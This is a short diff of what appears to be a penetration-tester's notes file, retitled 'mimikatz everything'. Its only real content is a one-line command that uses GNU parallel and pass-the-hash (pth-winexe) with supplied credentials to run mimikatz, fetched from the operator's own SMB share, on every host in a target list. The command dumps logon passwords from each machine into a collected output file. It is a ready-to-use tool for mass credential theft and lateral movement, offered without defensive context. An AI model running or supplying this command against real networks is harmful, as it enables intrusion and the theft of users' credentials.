@@ -1,4 +1,4 @@
 # parallel
 
-Paul H:
+# mimikatz everything (paul h)
 hip=$(ifconfig eth0 | grep -o '[0-9.]\{8,16\}' | head -n1); sort -R targets.txt | parallel -P10 --timeout 60 --tag -q pth-winexe --system --uninstall -U "$CREDS" //{} "cmd /c IF %PROCESSOR_ARCHITECTURE%==x86 (\\\\$hip\\smb_share\\mimikatz.exe privilege::debug sekurlsa::logonpasswords exit) else (\\\\$hip\\smb_share\\mimikatz64.exe privilege::debug sekurlsa::logonpasswords exit)" 2> parallel.error | tee -a mimikatz_everything.txt
